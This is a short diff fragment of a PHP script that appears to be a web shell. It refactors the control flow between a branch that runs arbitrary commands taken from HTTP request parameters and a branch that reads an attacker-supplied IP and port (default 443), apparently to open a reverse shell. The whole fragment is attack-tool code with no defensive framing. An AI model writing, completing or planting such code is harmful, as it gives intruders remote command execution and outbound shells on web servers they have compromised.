@@ -46,11 +46,7 @@ if (isset($_REQUEST[$cmd])) {
    if (!executeCommand($_REQUEST[$cmd])) {
       echo 'The command failed to run';
    }
-
-   die();
-}
-
-if (isset($_REQUEST[$ip])) {
+} elseif (isset($_REQUEST[$ip])) {
    // default port 443
    $port = isset($_REQUEST[$port])
       ? $_REQUEST[$port]
